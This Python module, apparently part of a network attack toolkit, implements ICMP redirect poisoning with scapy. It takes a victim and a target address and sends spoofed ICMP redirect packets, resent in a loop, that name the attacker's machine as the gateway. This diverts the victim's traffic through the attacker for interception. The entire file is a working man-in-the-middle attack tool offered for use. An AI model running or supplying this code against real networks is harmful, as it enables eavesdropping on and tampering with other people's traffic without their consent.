from scapy.all import *
from poison import Poison
from threading import Thread
from zoption import Zoption
import time
import config
import util


class icmp(Poison):
    def __init__(self):
        super(icmp, self).__init__('ICMP Redirection')
        conf.verb = 0
        self.local  = (config.get('ip_addr'), get_if_hwaddr(config.get('iface')))
        self.victim = ()
        self.target = ()
        self.config.update({"victim_ip":Zoption(type = "ip", 
                                         value = None,
                                         required = True, 
                                         display = "Redirect host"),
                            "target_ip":Zoption(type = "ip", 
                                         value = None,
                                         required = True, 
                                         display = "Redirect victim to"),
                            "respoof":Zoption(type = "int", 
                                       value = 15,
                                       required = False, 
                    display = "Interval (seconds) to send respoofed redirects")
                           })
        self.info = """
                    Send ICMP redirects to a victim.  The victim system needs
                    to be configured to allow ICMP redirects, which is not 
                    the default case.
                    """

    def initialize(self):
        """ initialize a poison
        """
        util.Msg('Initializing ICMP poison...')
        self.victim = (self.config['victim_ip'].value, 
                getmacbyip(self.config['victim_ip'].value))
        self.target = (self.config['target_ip'].value,
                getmacbyip(self.config['target_ip'].value))

        self.running = True
        thread = Thread(target=self.inject)
        thread.start()
        return self.victim[0]

    def inject(self):
        """ Send ICMP redirects to the victim
        """
        # icmp redirect
        pkt = IP(src=self.target[0], dst=self.victim[0])
        pkt /= ICMP(type=5, code=1, gw=self.local[0])

        # fake UDP
        pkt /= IP(src=self.victim[0], dst=self.target[0])
        pkt /= UDP()

        while self.running:
            send(pkt)
            time.sleep(self.config['respoof'].value)

        return self.victim[0]

    def shutdown(self):
        """ Shutdown ICMP spoofing
        """
        if self.running:
            util.Msg("Shutting ICMP redirect down "\
                    "(this could take up to %s seconds)" % \
                        self.config['respoof'].value)
            self.running = False
        return True